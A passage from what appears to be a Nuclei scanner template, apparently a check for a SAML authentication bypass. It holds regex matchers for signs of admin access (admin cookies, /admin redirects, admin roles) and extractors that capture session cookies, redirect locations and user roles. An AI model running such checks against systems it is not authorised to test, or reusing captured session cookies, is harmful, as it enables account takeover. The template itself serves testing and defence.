          - '(?i)set-cookie:\s*[^=]+=[^;\r\n]*admin[^;\r\n]*'
          - '(?i)location:\s*/admin[^\r\n]*'
          - '(?i)location:\s*/dashboard[^\r\n]*'
          - '(?i)"role":\s*"(admin|administrator|superadmin)"'
          - '(?i)"user":\s*"[^"]*admin[^"]*"'
          - '(?i)welcome\s+(admin|administrator)'
        condition: or

    extractors:
      - type: regex
        name: saml_session
        part: header
        regex:
          - '(?i)set-cookie:\s*([^=]+=[^;\r\n]*)'
          
      - type: regex
        name: redirect_location
        part: header
        regex:
          - '(?i)location:\s*([^\r\n]+)'
          
      - type: regex
        name: user_role
        part: body
        regex:
          - '(?i)"role":\s*"([^"]+)"'
          - '(?i)"user":\s*"([^"]+)"'
          - '(?i)welcome\s+([^\s<]+)'
          
      - type: kval
        part: header
        kval:
          - Set-Cookie
          - Location
          - X-SAML-Status